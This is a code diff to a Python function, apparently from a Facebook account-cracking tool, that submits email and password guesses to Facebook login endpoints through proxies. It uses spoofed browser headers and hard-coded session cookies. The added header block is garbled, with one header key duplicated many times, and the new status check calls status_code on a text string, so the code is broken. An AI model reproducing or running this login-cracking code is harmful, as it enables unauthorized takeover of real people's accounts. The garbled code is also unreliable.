@@ -240,24 +240,42 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
+            cookies = {
+            'sb': 'VKa9ZkevIqGKH5mmTljYdUro',
+            'datr': 'VKa9Zn2S1Z_ptvbMV96KkeAx',
+            'ps_l': '1',
+            'ps_n': '1',
+            'wd': '1440x773',
+            'fr': '1TtcqI6vgDuofxZxz.AWWD56RW899jg7K7FR5hmWOBrVY.BmvaYd..AAA.0.0.BmxLRn.AWVUkN1IrZw',}
             header_freefb = {'authority': 'm.facebook.com',
             'method': 'GET',
             'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent':pro}
-            response = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data = log_data,headers = header_freefb,proxies = proxies)
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            # 'cookie': 'sb=VKa9ZkevIqGKH5mmTljYdUro; datr=VKa9Zn2S1Z_ptvbMV96KkeAx; ps_l=1; ps_n=1; wd=1440x773; fr=1TtcqI6vgDuofxZxz.AWWD56RW899jg7K7FR5hmWOBrVY.BmvaYd..AAA.0.0.BmxLRn.AWVUkN1IrZw',
+            'dpr': '1',
+            'origin': 'https://mbasic.alpha.facebook.com',
+            'priority': 'u=0, i',
+            'referer': 'https://mbasic.alpha.facebook.com/?',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-ch-ua-model': '""',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-fetch-dest': 'document',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-fetch-mode': 'navigate',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-fetch-site': 'same-origin',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-fetch-user': '?1',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','upgrade-insecure-requests': '1',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','viewport-width': '885',}
+            response = session.post('https://mbasic.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data = log_data,headers = header_freefb,proxies = proxies)
             response_text = response.text
-            if response.status_code == 200:
+            if response_text.status_code == 200:
               #print(f"\r\033[1;91m [succes] - Status code {response.status_code}")
               #print(f"\x1b[38;5;196m[proxies💔] {proxies}")
               log_cookies=session.cookies.get_dict().keys()
